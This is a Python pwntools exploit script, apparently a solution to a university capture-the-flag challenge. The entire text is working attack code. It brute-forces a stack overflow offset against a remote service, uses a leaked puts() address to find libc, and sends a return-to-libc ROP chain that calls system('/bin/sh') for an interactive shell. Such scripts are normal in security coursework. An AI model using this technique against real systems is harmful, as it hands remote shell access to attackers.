from pwn import *

libc = ELF("libc.so.6", checksec=False)

OFFSET_MIN = 8
OFFSET_MAX = 100
def start():
    return remote("cse4850-brop-1.chals.io", 443, ssl=True, sni="cse4850-brop-1.chals.io")

def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info(f"Trying an offset of {i}")
        with context.quiet:
            p = start()
            p.recvuntil(b"Lifehouse")
            p.sendlineafter(b"--------------------------------------------------------------------------------", b"A"*i)
            try:
                p.recvuntil(b"Input Received.")
            except EOFError:
                p.close()
                return i//8 * 8
            p.close()

offset = find_offset()
log.info(f"Found offset: {offset}")
pause()

p = start()
p.recvuntil(b"address of puts() 0x")
remote_puts = int(p.recv(12), 16)
log.info(f"Puts found at {hex(remote_puts)}")

address = remote_puts - libc.sym['puts']
address_diff = address - libc.address

r = ROP(libc)
ret = r.find_gadget(['ret'])[0] + address_diff
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0] + address_diff
bin_sh = next(libc.search(b'/bin/sh')) + address_diff
system = libc.sym['system'] + address_diff

chain = b"A"*offset
chain += p64(ret)
chain += p64(pop_rdi)
chain += p64(bin_sh)
chain += p64(system)

p.recvuntil(b"Lifehouse")
p.sendlineafter(b"--------------------------------------------------------------------------------", chain)
p.interactive()
